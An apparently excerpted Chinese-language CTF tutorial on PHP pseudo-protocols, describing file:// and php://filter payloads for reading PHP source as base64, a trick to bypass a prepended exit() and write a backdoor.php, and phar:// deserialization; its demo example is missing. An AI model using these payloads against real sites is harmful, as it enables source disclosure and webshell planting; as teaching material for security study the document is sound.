二.常见的PHP伪协议

1.file://

用于访问本地的文件系统,在CTF中常常用来读取本地文件

特点：不受php.ini中allow_url_fopen与allow_url_include的配置影响

2.php://

用于处理I/O streams。

常用的是php://filter和php://input,当然还有其他诸如php://input和php://output、php://stdin和php://stdout的伪协议。

1>php://filter

参数说明:

1.resource = <>

2.read = <>

3.write = <写链的过滤器>

4.分号; 用于连接多个过滤器

常见的过滤器有：转换过滤器、字符串过滤器、压缩过滤器、加密过滤器

实战应用:

（1）转换过滤器

base64编码和解码

php://filter/read=convert.base64-encode/resource = file.php

php://filter/read=convert.base64-decode/resource = file.php

获取PHP源码:

经过convert.base64-encode过滤器之后，读取的resource内容将以base64编码形式回显。

如果resource指向的是一个PHP文件的话，未经编码则会进行PHP文件的执行。
当编码后会以编码后的字符串回显，从而达到获取PHP源码信息。

绕过死亡exit()，上传? ：

这种一般存在于缓存、配置文件等等不允许用户直接访问的文件情景中。

demo：

绕过手段：

$file = php://filter/read=convert.base64-decode/resource = backdoor.php

基于base64解码时需要四个字符为一组,在进行解码的时候会对非64个可视字符(a-zA-Z0-9+/)进行绕过,那么我们此处就对死亡exit产生影响:phpexit

所以上传 $content = a…..(base64编码)(开头的a可以与前面的phpexit进行拼接)

当然也可以使用rot13进行绕过，此处不再赘述…

(2)字符串过滤器

rot13加密

php://filter/read=string.rot13/resource = file.php

大小写转换

php://filter/read=string.toupper/resource = file.php (大写)

php://filter/read=string.tolower/resource = file.php (小写)

在读取的字符串中删去HTML和PHP标签、空字符串

php://filter/read=string.strip_tags/resource = file.php

4.phar://

简单理解就是将文件进行压缩归档，此过程会涉及对象的序列化。
在解压的时候自然会涉及反序列化，那么只要设计合适的恶意对象就可以引发反序列化漏洞。
